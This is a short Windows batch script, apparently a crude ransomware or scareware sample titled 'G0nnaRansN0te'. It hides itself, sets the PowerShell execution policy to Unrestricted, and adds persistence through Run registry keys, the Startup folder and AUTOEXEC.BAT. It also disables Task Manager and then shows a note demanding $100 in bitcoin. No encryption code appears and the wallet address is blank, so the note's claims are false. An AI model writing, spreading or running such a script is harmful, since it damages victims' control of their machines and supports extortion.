@echo off
attrib +h +s %0
powershell -command "Set-ExecutionPolicy Unrestricted"
set valinf="rundll32_%random%_toolbar"
set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
copy %0 "%userprofile%\Start Menu\Programs\Startup"
echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
cls
title G0nnaRansN0te
echo|set/p=|clip
cls
color 0C
echo.

echo.
echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo Your files are unusable pay $100 in bitcoin to  to get a decryption file and key.
echo The wallet has been copied to your clipboard
echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
pause >nul